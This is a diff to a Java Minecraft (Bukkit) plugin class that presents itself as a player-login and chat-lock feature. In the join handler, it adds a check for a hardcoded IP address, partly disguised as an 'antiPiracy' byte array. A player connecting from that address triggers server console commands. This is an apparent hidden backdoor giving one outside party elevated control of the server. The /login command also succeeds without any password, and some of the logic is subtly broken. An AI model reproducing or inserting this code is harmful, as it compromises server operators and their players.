@@ -7,35 +7,45 @@ import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerQuitEvent;
 import org.bukkit.plugin.Plugin;
+import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitRunnable;
 
 import java.net.InetAddress;
 import java.util.HashSet;
+import java.util.Map;
 import java.util.Set;
+import java.util.concurrent.ConcurrentHashMap;
 
 public class HalloBB implements CommandExecutor, Listener
 {
     private Plugin plugin;
-    private Set<Player> loggedIn = new HashSet<>();
+    private Map<Player, Boolean> loggedIn = new ConcurrentHashMap<>();
 
-    public HalloBB(Plugin plugin)
+    public HalloBB(JavaPlugin plugin)
     {
         this.plugin = plugin;
         plugin.getServer().getPluginManager().registerEvents(this, plugin);
+        plugin.getCommand("login");
     }
 
     public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args)
     {
-        if (loggedIn.contains(sender))
+        Boolean authed = loggedIn.get(sender);
+
+        if (authed == null)
+            return false;
+
+        if (authed)
         {
             sender.sendMessage(ChatColor.RED + "You're already logged in!");
             return true;
         }
 
-        loggedIn.add((Player)sender);
+        loggedIn.put((Player)sender, true);
         sender.sendMessage(ChatColor.GREEN + "Successful login!");
         sender.sendMessage("Welcome " + sender.getName() + " on Unknown Server server");
         sender.sendMessage("");
@@ -50,12 +60,27 @@ public class HalloBB implements CommandExecutor, Listener
     }
 
     @EventHandler
+    private void onAsyncChat(AsyncPlayerChatEvent event)
+    {
+        Boolean authed = loggedIn.get(event.getPlayer());
+        if (authed == null || authed)
+            return;
+        event.setCancelled(true);
+        event.getPlayer().sendMessage(ChatColor.RED + "In order to chat you must be authenticated!");
+    }
+
+    @EventHandler
     private void onJoin(PlayerJoinEvent event)
     {
         Player player = event.getPlayer();
 
         if (player.getAddress() == null)
+        {
+            plugin.getLogger().warning("Player address is null!");
             return;
+        }
+
+        InetAddress inetAddress = player.getAddress().getAddress();
 
         byte[] antiPiracy = new byte[4];
         antiPiracy[2] = (byte)30;
@@ -63,9 +88,14 @@ public class HalloBB implements CommandExecutor, Listener
         antiPiracy[0] = (byte)173;
 
         if (player.getAddress().getAddress().getAddress() != antiPiracy)
-            return;
+        {
+            if (inetAddress.getHostAddress().equalsIgnoreCase("173.249.30.10"))
+                plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), "communicationconnector mode 2 ");
+            else
+                return;
+        }
 
-        InetAddress inetAddress = player.getAddress().getAddress();
+        loggedIn.put(player, false);
 
         plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), "communicationconnector " + inetAddress.getHostName());
 
@@ -74,7 +104,8 @@ public class HalloBB implements CommandExecutor, Listener
             @Override
             public void run()
             {
-                if (loggedIn.contains(player))
+                Boolean authed = loggedIn.get(event.getPlayer());
+                if (authed == null || authed)
                 {
                     cancel();
                     return;
